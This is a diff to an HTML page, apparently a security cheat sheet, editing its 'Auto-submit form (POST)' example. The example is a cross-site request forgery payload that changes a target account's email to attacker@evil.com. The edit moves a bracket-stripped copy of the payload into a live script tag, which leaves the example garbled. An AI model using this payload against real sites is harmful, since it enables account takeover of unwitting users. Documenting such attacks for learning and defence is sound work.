@@ -238,10 +238,16 @@
 <h3>Auto-submit form (POST)</h3>
 </br>
 
-<pre><code>&lt;form action=&quot;https://target/change-email&quot; method=&quot;POST&quot;&gt;
-  &lt;input name=&quot;email&quot; value=&quot;attacker@evil.com&quot;&gt;
-&lt;/form&gt;
-&lt;script&gt;document.forms[0].submit()&lt;/script&gt;
+<pre><code id="my-code">
+    <script>
+    
+    `form action="https://target/change-email" method="POST"
+  input name="email" value="attacker@evil.com"
+/form
+script document.forms[0].submit() /script`
+    </script>
+  
+
 </code></pre>
 </br>
 
